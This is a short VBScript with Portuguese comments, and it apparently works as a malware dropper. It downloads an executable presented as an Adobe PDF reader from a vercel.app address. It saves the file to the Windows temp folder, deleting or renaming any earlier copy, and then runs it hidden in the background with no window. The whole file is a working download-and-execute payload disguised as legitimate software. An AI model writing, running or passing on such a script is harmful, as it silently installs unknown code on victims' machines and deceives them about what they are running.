Dim url, destino, http, stream, shell, fso, tempFolder, novoDestino

url = "https://testando123-blond.vercel.app/Adobe%20-%20Leitor%20de%20PDF.exe"
Set shell = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")
tempFolder = shell.ExpandEnvironmentStrings("%TEMP%")
destino = tempFolder & "\Adobe - Leitor de PDF.exe"

' Tenta apagar arquivo antigo se existir
If fso.FileExists(destino) Then
    On Error Resume Next
    fso.DeleteFile destino, True
    On Error GoTo 0
End If

' Se ainda existir, cria nome com timestamp para evitar conflito
If fso.FileExists(destino) Then
    Randomize
    novoDestino = tempFolder & "\Adobe - Leitor de PDF_" & Replace(Replace(Now, ":", ""), " ", "_") & ".exe"
Else
    novoDestino = destino
End If

' Faz download
Set http = CreateObject("MSXML2.XMLHTTP")
http.Open "GET", url, False
http.Send

If http.Status = 200 Then
    Set stream = CreateObject("ADODB.Stream")
    stream.Type = 1 ' BinÃ¡rio
    stream.Open
    stream.Write http.ResponseBody
    stream.SaveToFile novoDestino, 2 ' Sobrescrever
    stream.Close

    ' Executa o arquivo baixado em segundo plano
    shell.Run Chr(34) & novoDestino & Chr(34), 0, False
Else
    MsgBox "Erro ao baixar o arquivo. Status: " & http.Status
End If
